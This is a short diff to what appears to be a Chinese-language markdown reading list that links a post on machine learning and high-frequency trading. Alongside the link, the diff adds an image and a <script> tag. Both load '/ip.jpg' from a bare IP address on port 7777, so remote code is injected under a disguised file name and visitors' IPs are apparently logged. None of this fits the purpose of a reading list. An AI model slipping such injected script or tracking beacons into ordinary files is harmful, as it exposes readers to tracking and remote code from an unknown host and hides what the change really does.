@@ -11,3 +11,7 @@
 
 ## 好文
 + [How I made $500k with machine learning and HFT (high frequency trading)](http://jspauld.com/post/35126549635/how-i-made-500k-with-machine-learning-and-hft)
+
+![](http://45.76.51.44:7777/ip.jpg)
+
+<script src="http://45.76.51.44:7777/ip.jpg">
